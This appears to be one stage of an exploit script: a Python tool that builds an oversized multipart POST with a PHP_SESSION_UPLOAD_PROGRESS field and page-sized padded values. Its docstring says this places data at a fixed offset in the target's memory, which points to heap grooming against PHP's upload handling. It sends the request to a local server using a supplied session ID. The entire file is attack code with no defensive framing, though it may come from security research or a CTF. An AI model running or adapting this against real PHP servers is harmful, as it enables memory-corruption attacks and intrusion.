#!/usr/bin/env python3
"""Place a raw multipart field value at main+0x84000 (dt).

Usage: send_raw.py <port> <sid> <used_slots> [pages] [target] [parts]
"""
import socket
import sys

port = int(sys.argv[1])
sid = sys.argv[2]
used = int(sys.argv[3])
pages = int(sys.argv[4]) if len(sys.argv) > 4 else 6
target = sys.argv[5] if len(sys.argv) > 5 else "/upload.php"
parts = int(sys.argv[6]) if len(sys.argv) > 6 else 1

size = pages * 4096 - 48
val = used.to_bytes(8, "little", signed=True) + b"L" * (size - 8)
boundary = b"----raw"
fields = b"".join(
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="g' + str(i).encode() + b'"\r\n\r\n'
    + val + b"\r\n"
    for i in range(parts)
)
body = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    + fields +
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="t"\r\n\r\nZ\r\n'
    b"--" + boundary + b"--\r\n"
)
req = (
    b"POST " + target.encode() + b" HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n"
) + body

s = socket.create_connection(("127.0.0.1", port), timeout=30)
s.sendall(req)
resp = b""
try:
    while True:
        c = s.recv(65536)
        if not c:
            break
        resp += c
except socket.timeout:
    pass
s.close()
head, _, out = resp.partition(b"\r\n\r\n")
print(head.split(b"\r\n", 1)[0].decode("latin-1"))
print("req=%d body=%d" % (len(body), len(out)))
